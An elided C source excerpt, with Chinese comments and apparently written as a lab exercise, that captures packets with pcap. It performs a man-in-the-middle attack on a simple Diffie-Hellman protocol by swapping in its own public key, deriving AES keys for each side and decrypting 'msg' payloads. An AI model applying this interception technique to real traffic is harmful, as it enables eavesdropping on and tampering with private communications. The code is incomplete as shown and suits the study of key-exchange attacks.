...
int main(int argc, char **argv)
{
    ...
    if (pcap_loop(descr, -1, (pcap_handler)process_pkt, (u_char *)&ip_t) == -1)
    {
...
void process_pkt(IP_T *ip_t, const struct pcap_pkthdr *pkthdr, const u_char *packet)
{
    ...
    struct tcphdr *tcp = (struct tcphdr *)(packet + ETHER_HDR_LEN + sizeof(struct iphdr)); //tcp头
    
    // 数据包头部总长度
    int header_len = ETHER_HDR_LEN + sizeof(struct iphdr) + sizeof(struct tcphdr) + 12; 
    int data_len = pkthdr->len - header_len;     // 数据包数据真实长度
    
    unsigned char src_ip[16];// 源IP
    bzero(src_ip, 16);
    inet_ntop(AF_INET, &(ip->saddr), (char *)src_ip, 16); // 源地址存入src_ip
    ...
    // 若捕获到的是客户端发出的数据包
    if (strncmp((char *)src_ip, (char *)ip_t->client_ip, strlen((char *)src_ip)) == 0)
    {
        // 若发送的是素数p，则自己保存
        ...
        else if (strncmp((char *)packet + header_len, "pub", 3) == 0)
        {
            ...
            // 密钥扩展
            aes_client.setCipherKey((char *)key2client, 32);
            
            // 写入中间人自己的公钥
            mpz_get_str((char *)packet + header_len + 3, 16, middle_dh.pub_key);
        ...
        else if (strncmp((char *)packet + header_len, "msg", 3) == 0)
        {
            ...
            {
                plain_text[i] = cripher[i];
            }
            memcpy((void *)packet + header_len + 3, plain_text, sizeof(plain_text));
    ...
    // 若捕获到的是服务器发出的数据包
    else if (strncmp((char *)src_ip, (char *)ip_t->server_ip, strlen((char *)src_ip)) == 0)
    {
        ...
        if (strncmp((char *)packet + header_len, "pub", 3) == 0)
        {
            ...
            // 密钥扩展
            aes_server.setCipherKey((char *)key2server, 32);
            // 写入中间人自己的公钥
            mpz_get_str((char *)packet + header_len + 3, 16, middle_dh.pub_key);
